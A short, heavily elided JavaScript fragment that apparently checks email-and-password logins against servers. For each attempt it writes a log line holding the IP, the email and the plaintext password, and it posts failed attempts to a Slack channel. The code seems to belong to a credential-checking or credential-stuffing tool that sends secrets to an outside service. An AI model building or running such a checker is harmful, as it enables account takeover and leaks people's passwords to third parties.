...
const SLACK_CHANNEL_ID = "C081R2WBN2V";
...
const checkConnect = async (page, emailAddress, PASSWORD, server) => {
  try {
    ...
    if (hasConnect && 
      ...
      const logEntry = `True Log ${date} IP: ${server} ${emailAddress} P: ${PASSWORD}\n`;
      count++;
    ...
    const date = formatDateTime();
    const falseLog = `False Log ${date} IP: ${server} ${emailAddress} P: ${PASSWORD}\n`;

    sendSlackMessage (`${falseLog}`);
    return false;
  } catch (error) {
